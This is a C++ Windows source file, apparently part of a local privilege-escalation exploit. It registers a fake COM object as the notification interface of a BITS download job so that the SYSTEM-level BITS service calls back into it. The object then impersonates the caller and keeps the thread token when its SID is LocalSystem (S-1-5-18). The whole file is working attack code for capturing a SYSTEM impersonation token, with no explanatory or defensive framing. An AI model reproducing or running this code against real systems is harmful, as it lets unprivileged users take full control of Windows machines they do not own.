#include "stdafx.h"
#include <bits.h>
#include <bits4_0.h>
#include <stdio.h>
#include <tchar.h>
#include <lm.h>
#include <iostream>
#include <exception>
#include <string>
#include <comdef.h>
#include <memory>
#include <new>
#include <sddl.h>

// {1941C949-0BDE-474F-A484-9F74A8176A7C}, ensure it's an interface with a registered proxy
IID IID_FakeInterface = { 0x6EF2A660, 0x47C0, 0x4666, { 0xB1, 0x3D, 0xCB, 0xB7, 0x17, 0xF2, 0xFA, 0x2C, } };

class FakeObject : public IUnknown
{
	LONG m_lRefCount;
	HANDLE* m_ptoken;

	void TryImpersonate()
	{
		if (*m_ptoken == nullptr)
		{
			HRESULT hr = CoImpersonateClient();
			if (SUCCEEDED(hr))
			{
				HANDLE hToken;
				if (OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, FALSE, &hToken))
				{
					PTOKEN_USER user = (PTOKEN_USER)malloc(0x1000);
					DWORD ret_len = 0;

					if (GetTokenInformation(hToken, TokenUser, user, 0x1000, &ret_len))
					{
						LPWSTR sid_name;

						ConvertSidToStringSid(user->User.Sid, &sid_name);

						if ((wcscmp(sid_name, L"S-1-5-18") == 0) && (*m_ptoken == nullptr))
						{
							*m_ptoken = hToken;
							RevertToSelf();
						}
						else
						{
							CloseHandle(hToken);
						}

						printf("Got Token: %p %ls\n", hToken, sid_name);
						LocalFree(sid_name);
					}
					else
					{
						printf("Error getting token user %d\n", GetLastError());
					}
					free(user);
				}
				else
				{
					printf("Error opening token %d\n", GetLastError());
				}
			}
		}
	}

public:
	//Constructor, Destructor
	FakeObject(HANDLE* ptoken) {
		m_lRefCount = 1;
		m_ptoken = ptoken;
		*m_ptoken = nullptr;
	}

	~FakeObject() {};

	//IUnknown
	HRESULT __stdcall QueryInterface(REFIID riid, LPVOID *ppvObj)
	{
		TryImpersonate();

		if (riid == __uuidof(IUnknown))
		{
			*ppvObj = this;
		}
		else if (riid == IID_FakeInterface)
		{
			printf("Check for FakeInterface\n");
			*ppvObj = this;
		}
		else
		{
			*ppvObj = NULL;
			return E_NOINTERFACE;
		}

		AddRef();
		return NOERROR;
	}

	ULONG __stdcall AddRef()
	{
		TryImpersonate();
		return InterlockedIncrement(&m_lRefCount);
	}

	ULONG __stdcall Release()
	{
		TryImpersonate();
		// not thread safe
		ULONG  ulCount = InterlockedDecrement(&m_lRefCount);

		if (0 == ulCount)
		{
			delete this;
		}

		return ulCount;
	}
};

_COM_SMARTPTR_TYPEDEF(IBackgroundCopyJob, __uuidof(IBackgroundCopyJob));
_COM_SMARTPTR_TYPEDEF(IBackgroundCopyManager, __uuidof(IBackgroundCopyManager));

bool DoCaptureToken(HANDLE* ptoken)
{
	// If CoInitializeEx fails, the exception is unhandled and the program terminates	

	IBackgroundCopyJobPtr pJob;
	try
	{
		//The impersonation level must be at least RPC_C_IMP_LEVEL_IMPERSONATE.
		HRESULT hr = CoInitializeSecurity(NULL,
			-1,
			NULL,
			NULL,
			RPC_C_AUTHN_LEVEL_CONNECT,
			RPC_C_IMP_LEVEL_IMPERSONATE,
			NULL,
			EOAC_DYNAMIC_CLOAKING,
			0);
		if (FAILED(hr))
		{
			throw _com_error(hr);
		}

		// Connect to BITS.
		IBackgroundCopyManagerPtr pQueueMgr;

		IMonikerPtr pNotify;

		CreatePointerMoniker(new FakeObject(ptoken), &pNotify);

		hr = CoCreateInstance(__uuidof(BackgroundCopyManager), NULL,
			CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&pQueueMgr));

		if (FAILED(hr))
		{
			// Failed to connect.
			throw _com_error(hr);
		}

		GUID guidJob;
		hr = pQueueMgr->CreateJob(L"BitsAuthSample",
			BG_JOB_TYPE_DOWNLOAD,
			&guidJob,
			&pJob);

		if (FAILED(hr))
		{
			// Failed to connect.
			throw _com_error(hr);
		}

		pJob->SetNotifyInterface(pNotify);
	}
	catch (const std::bad_alloc &)
	{
		wprintf(L"Memory allocation failed");
		if (pJob)
		{
			pJob->Cancel();
		}

		return false;
	}
	catch (const _com_error &ex)
	{
		wprintf(L"Error '%ls' occurred during operation", ex.ErrorMessage());
		if (pJob)
		{
			pJob->Cancel();
		}

		return false;
	}

	return true;
}

class CoInitializer
{
public:
	CoInitializer()
	{
		CoInitialize(NULL);
	}

	~CoInitializer()
	{
		CoUninitialize();
	}
};

HANDLE CaptureImpersonationToken()
{
	CoInitializer coinit;
	HANDLE token = nullptr;

	if (DoCaptureToken(&token))
	{
		return token;
	}

	return nullptr;
}
